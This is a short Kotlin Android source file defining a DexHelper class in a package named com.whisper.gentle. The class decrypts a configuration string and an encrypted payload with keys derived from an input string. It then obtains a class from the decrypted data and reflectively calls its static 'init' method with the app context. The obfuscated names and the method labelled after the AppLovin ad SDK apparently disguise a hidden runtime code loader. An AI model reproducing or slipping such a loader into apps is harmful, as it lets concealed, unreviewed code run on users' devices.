package com.whisper.gentle

import android.content.Context
import com.whisper.gentle.core.InitSdk

/**
 * Date：2025/11/18
 * Describe:
 */
class DexHelper {
    lateinit var m: InitSdk

    fun a(context: Context, str: String) {
        //gasd12
        val key = str.substring(0, 10) + m.key
        m.initJson(String(a(key.toByteArray(), m.token)))
        appLovin(context, str.substring(12), key)
    }

    private fun appLovin(context: Context, inputStr: String, key: String): String {
        if (inputStr.length < 10) return inputStr
        val clz = m.appLovinAction(a(key.toByteArray(), inputStr), context)
        clz?.getMethod("init", Context::class.java)?.invoke(null, context)
        return key + inputStr
    }

    private fun a(keyAes: ByteArray, inStr: String): ByteArray {
        return m.appLov(keyAes, inStr)
    }

}